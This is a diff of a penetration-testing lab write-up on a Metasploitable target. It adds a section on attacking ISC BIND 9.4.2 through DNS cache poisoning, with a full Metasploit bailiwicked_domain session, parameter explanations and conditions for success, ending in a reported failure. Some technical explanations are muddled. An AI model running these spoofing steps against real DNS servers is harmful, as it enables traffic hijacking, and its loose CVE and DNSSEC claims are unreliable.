@@ -287,7 +287,7 @@ sudo chmod 600 target_rsa_idd
 
 ```
 msfconsole
-msf>search ssh_login_pubkey
+msf> search ssh_login_pubkey
 msf> use auxiliary/scanner/ssh/ssh_login_pubkey
 #setting the required field 
 msf  auxiliary(ssh_login_pubkey) > options
@@ -384,11 +384,48 @@ From the output we can conclude that we have identified different user on the ta
 
 ---
 
-## Exploiting Service on Port 53: Domain-> ISC BIND 
+## Exploiting Service on Port 53: Domain-> ISC BIND 9.4.2
 ISC BIND is the most commonly used domain services in the linux based system. It mainly used to resolve the domain name into the ip address, so that we can access that website/server over the internet.
-
+![](../images/service_on_port_53.png)
 
 ### Identifying Vulnerabilites or Weakness
+Here we I am using vulners script to search for vulnerability in the ISC bind service. I find quiet lots of vulnerabilities correspond to this services but most of them are DOS(Denial of Service) and DNS spoofing attack. I also search on google, vulners.com and CVE details to verify these vulerabilities(always prefered). Through My reasearch of exploiting the vulnerabilites on domain service, I found the two main vulnerability that I can exploit is-
+**1.DNS Cache Poisoning/DNS Hijacking vulnerability** **CVE-2008-4194/1447**
+In this vulnerability, we can send dns responses(poisoning) to the target in order to cache the false dns entry for a specific domain in the target dns server. 
+**2.Buffer-Overflow vulnerability** **CVE-2021-25216**
+
+### Exploitation
+#### Exploitation Using the DNS cache poisoning
+For this, on a little search on google I found a metasploit exploit module which can perform the dns poisoning attack for a specific domain/host.
+**auxiliary/spoof/dns/bailiwicked_domain**
+**auxiliary/spoof/dns/bailiwicked_host**
+```
+sudo msfconsole
+msf > search spoof/dns
+msf > use auxiliary/spoof/dns/bailiwicked_domain
+msf auxiliary(spoof/dns/bailiwicked_domain) > set RHOSTS 192.168.1.103
+#recons is important as it queries to get the dns info about the target domain and helps the dns spoof response appear legitimate to mimicking the real dns-data, so it is set to an open external dns server.
+msf auxiliary(spoof/dns/bailiwicked_domain) > set RECONS 199.43.133.53
+#The host to which the domain is spoofed with( I am using my attacker machine server)
+msf auxiliary(spoof/dns/bailiwicked_domain) > set NEWDNS 192.168.1.101
+#Domian which we want to spoof
+msf auxiliary(spoof/dns/bailiwicked_domain) > set DOMAIN example.com
+#if you don't know the target's response port set it to 0 to check for all ports
+msf auxiliary(spoof/dns/bailiwicked_domain) > set SRCPORT 0
+msf auxiliary(spoof/dns/bailiwicked_domain) > set SRCADDR Real
+#It represent the no of spoofed response sends to the target. It should sent to high so that in race condition with the original dns respose, our spoofed response will win.
+msf auxiliary(spoof/dns/bailiwicked_domain) > set XIDS 20000
+msf auxiliary(spoof/dns/bailiwicked_domain) > run
+```
+As the attack is good to go, ensure that-
+1. The metasploitable machine uses the ISC BIND service to resolve the dns, as the metasploit is connected to LAN interface of opensense, there are chances that it is configure to dns forwarding to the opensense and if so the metaspoitable machine is not using its own ISC bind service and this attack doesn't work. For that you must ensure that there is **nameserver 127.0.0.1** entry in the resolv.conf file.
+2. Also check that your opensense firewall is not blocking the fluided dns responses in the network.
+3. The dns cache should be cleaned if there any prior entry about our target domain. 
+4. At last, the ISC bind is not configured to have DNSSEC enable, if so the target won't accept our spoofed dns responses.
+![]()
+![]()
+As of now I perform the attack multiple time, changing parameters and also analysis the traffic using wireshark but every times the attack fails to spoof the dns entry for that domain. I conclude that there is a DNSSEC is enabled on the example.com domain which takes PRG signature verification before the dns response get accepted, and so my spoofed dns responses got rejected by the target. Hence this attack not worked but I can try It using my own domain having not DNSSEC in future and hope so it works.
+--- 
 
 ## Exploiting Service on Port 80: Apache httpd 2.2.8 service
 The Apache HTTP Server (httpd) is an open-source web server software(Web container). It is one of the most widely used web servers in the world, designed to deliver the web content. It is compatible with mostly all operating systems like Linux, Windows, and macOS, and can serve both static and dynamic web pages. It uses mostly Php as a server side language.
